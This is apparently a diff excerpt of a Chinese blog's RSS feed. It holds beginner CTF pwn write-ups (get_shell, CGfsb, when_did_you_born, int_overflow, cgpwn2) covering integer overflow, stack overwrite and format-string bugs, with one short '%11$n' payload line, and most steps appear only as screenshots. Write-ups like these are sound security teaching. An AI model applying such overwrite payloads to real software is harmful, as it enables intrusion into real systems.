-&lt;p&gt;3.扔进IDA里面看一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111201440496.png&#34; alt=&#34;image-20210111201440496&#34;&gt;&lt;/p&gt;
-&lt;p&gt;一个溢出漏洞&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111201508483.png&#34; alt=&#34;image-20210111201508483&#34;&gt;&lt;/p&gt;
-&lt;p&gt;条件&lt;/p&gt;
-&lt;p&gt;这时候联想到题目的提示int_overflow&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111201549472.png&#34; alt=&#34;image-20210111201549472&#34;&gt;&lt;/p&gt;
-&lt;p&gt;无符号int型，最大256，257开始长度变为1&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111202408010.png&#34; alt=&#34;image-20210111202408010&#34;&gt;&lt;/p&gt;
-&lt;p&gt;又发现这个……&lt;/p&gt;
-&lt;h4 id=&#34;解题-7&#34;&gt;解题：&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111202818786.png&#34; alt=&#34;image-20210111202818786&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111202909100.png&#34; alt=&#34;image-20210111202909100&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111202841356.png&#34; alt=&#34;image-20210111202841356&#34;&gt;&lt;/p&gt;
-&lt;p&gt;完成。&lt;/p&gt;
-&lt;h3 id=&#34;题目-cgpwn2&#34;&gt;题目 cgpwn2&lt;/h3&gt;
-&lt;h4 id=&#34;题目描述-8&#34;&gt;题目描述：&lt;/h4&gt;
-&lt;p&gt;菜鸡认为自己需要一个字符串&lt;/p&gt;
-&lt;h4 id=&#34;题目分析-8&#34;&gt;题目分析：&lt;/h4&gt;
-&lt;p&gt;1.查看文件，保护，运行。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111203448731.png&#34; alt=&#34;image-20210111203448731&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111203523675.png&#34; alt=&#34;image-20210111203523675&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2.扔进IDA里面看一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111203716307.png&#34; alt=&#34;image-20210111203716307&#34;&gt;&lt;/p&gt;
-&lt;p&gt;很明显的一个漏洞&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111203739487.png&#34; alt=&#34;image-20210111203739487&#34;&gt;&lt;/p&gt;
-&lt;p&gt;调用了system函数，但是打印“hehehe”。去找了一下有没有“/bin/sh”，没找到。只能自己输入了&lt;/p&gt;
-&lt;h4 id=&#34;解题-8&#34;&gt;解题：&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111205429073.png&#34; alt=&#34;image-20210111205429073&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111205457550.png&#34; alt=&#34;image-20210111205457550&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111205518341.png&#34; alt=&#34;image-20210111205518341&#34;&gt;&lt;/p&gt;
-&lt;p&gt;完成。&lt;/p&gt;
-</description>
+      <description>攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的
+题目分析： nc链接，运行，拿到shell
+解题： 1.nc链接IP（端口是空格）
+2.ls查看文件，cat flag 获得flag
+题目 CGfsb 题目描述： 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用
+题目分析： 1.从题目描述来看，解题的关键是prinf
+2.查看文件格式，保护设置，运行一下
+发现是一个32位的文件，开启了NX、Stack保护
+这是程序的流程
+3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下
+这是一个高危漏洞！！！具体用法先放着，往下看。
+看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！
+而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。
+4.格式化字符串漏洞的简单运用
+%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表	示将0x64写入偏移10处保存的指针所指向的地址
+解题： 1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量
+输入aaaa，发现0x61616161（aaaa）偏移量为10
+2.编写脚本
+payload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里
+3.运行
+拿到falg
+4.注：
+还可以这样写payload=‘aaaa’+p32（0x0804A068）+&#39;%11$n&#39;
+题目 when_did_you_born 题目描述： 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办
+题目分析： 1.从描述来看，关键在于“年龄”
+2.查看文件格式，保护设置，运行一下
+64位，开启了stack、NX保护。
+这是程序基本流程。
+3.扔到IDA中看一下
+答案就在这！！！
+整体看一下
+所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个
+漏洞……
+查看一下
+v4下面正好是v5，那就可以直接覆盖了
+解题： 解决。
+题目 hello_pwn 题目描述： pwn！，segment fault! 菜鸡陷入了深思
+题目分析： 1.题目描述貌似没啥用，不管了
+2.查看文件，保护，运行一下
+64位，开启了NX保护
+就一句话……</description>
     </item>
     
   </channel>
